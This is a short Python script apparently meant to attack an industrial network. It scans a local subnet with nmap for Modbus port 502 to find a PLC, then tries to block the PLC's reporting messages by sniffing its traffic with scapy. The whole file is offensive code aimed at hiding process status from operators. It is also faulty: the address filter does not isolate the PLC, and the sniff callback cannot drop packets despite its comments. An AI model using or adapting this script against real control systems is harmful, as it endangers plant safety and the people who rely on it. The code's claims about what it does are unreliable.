import subprocess
import re
from scapy.all import *

# Function to find the PLC's IP address
def find_plc_ip():
    # Run Nmap to scan the network for the PLC
    nmap_output = subprocess.check_output(['nmap', '-p', '502', '--open', '192.168.1.0/24']).decode('utf-8')
    ip_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+)')
    ip_addresses = ip_pattern.findall(nmap_output)
    
    # Filter out the IP address of the PLC (assuming it's the only device with port 502 open)
    for ip in ip_addresses:
        if '502/tcp open' in nmap_output:
            return ip
    return None

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    # Define the filter to block Modbus TCP traffic (port 502)
    filter_rule = f"host {plc_ip} and port 502"
    
    # Use Scapy to block the traffic
    def packet_callback(packet):
        if packet.haslayer(TCP) and packet[TCP].dport == 502:
            print(f"Blocked packet from {packet[IP].src} to {packet[IP].dst}")
            return False  # Drop the packet
    
    # Start sniffing and blocking packets
    sniff(filter=filter_rule, prn=packet_callback, store=0)

if __name__ == "__main__":
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Block reporting messages
        block_reporting_messages(plc_ip)
    else:
        print("PLC not found on the network.")